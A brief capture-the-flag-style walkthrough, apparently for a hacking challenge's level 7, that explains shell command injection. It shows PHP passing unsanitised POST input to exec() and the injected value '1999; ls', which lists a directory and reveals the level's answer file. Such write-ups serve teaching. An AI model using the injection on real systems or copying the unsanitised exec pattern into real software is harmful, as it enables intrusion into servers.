This mission requires basic knowledge of linux shell commands and
operators. The command "ls" lists the contents of a directory, while the
semicolon (";") character ends one command without requiring a newline /
RET.\
You need to end the "cal" command and run ls. The script being run is
similar in effect to

    echo exec("cal ... ".$_POST['cal']);

With a normal input (a 4 digit number) the code is effectively

    echo exec("cal ... 1999");

We want to end the "cal" command and start the "ls" command, so we use a
semicolon, making the input "1999; ls" and the code

    echo exec("cal ... 1999; ls");

This should output the normal calendar information, and at the bottom
there should be something like

    .
    ..
    level7.php
    cal.pl

    index.php
    k1kh31b1n55h.php
    perl5.8.9.core
